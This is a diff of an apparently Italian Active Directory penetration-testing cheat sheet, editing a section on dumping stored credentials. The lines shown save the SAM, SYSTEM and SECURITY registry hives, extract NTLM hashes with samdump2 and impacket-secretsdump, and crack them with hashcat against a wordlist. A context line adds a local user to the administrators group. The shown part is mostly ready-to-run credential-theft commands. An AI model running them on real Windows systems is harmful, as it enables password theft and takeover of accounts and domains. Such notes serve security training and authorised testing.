@@ -228,15 +228,23 @@ net user <username> <password> /add /Y   && net localgroup administrators <usern
 ## Archiviazione e recupero credenziali memorizzate [Local Admin nella macchina]
 ### Poiché l'implementazione di Kerberos da parte di Microsoft utilizza il single sign-on, gli hash delle password devono essere archiviati da qualche parte per rinnovare una richiesta TGT. Nelle versioni correnti di Windows, questi hash sono archiviati nello spazio di memoria LSASS (Local Security Authority Subsystem Service). Se otteniamo l'accesso a questi hash, potremmo craccarli per ottenere la password in chiaro o riutilizzarli per eseguire varie azioni.
 ### Problemi: Sebbene questo sia l'obiettivo finale del nostro attacco AD, il processo non è così semplice come sembra. Poiché il processo LSASS fa parte del sistema operativo e viene eseguito come SYSTEM, abbiamo bisogno delle autorizzazioni SYSTEM (o amministratore locale) per ottenere l'accesso agli hash archiviati su una destinazione.Per questo motivo, per prendere di mira gli hash archiviati, spesso dobbiamo iniziare il nostro attacco con un'escalation dei privilegi locali. Per rendere le cose ancora più complicate, le strutture di dati utilizzate per archiviare gli hash in memoria non sono pubblicamente documentate e sono anche crittografate con una chiave archiviata in LSASS.
-##Prerequisito: Devi essere Local Domain Admin dentro la macchina exploitata 
+## Prerequisito: Devi essere Local Domain Admin dentro la macchina exploitata 
 
 - Uso reg per recupero NTLM
 ```
 reg save HKLM\sam sam
 
-reg save NKLM\system system
+reg save HKLM\system system
+
+reg save HKLM\security security
 
 samdump2 system sam (NTLM lo piazzi dentro un file .txt)
+
+hashcat -m 1000 -a 3 hash.txt rockyou.txt
+
+o 
+
+impacket-secretsdump -sam sam -security security -system system
 
 hashcat -m 1000 -a 3 hash.txt rockyou.txt
 ```
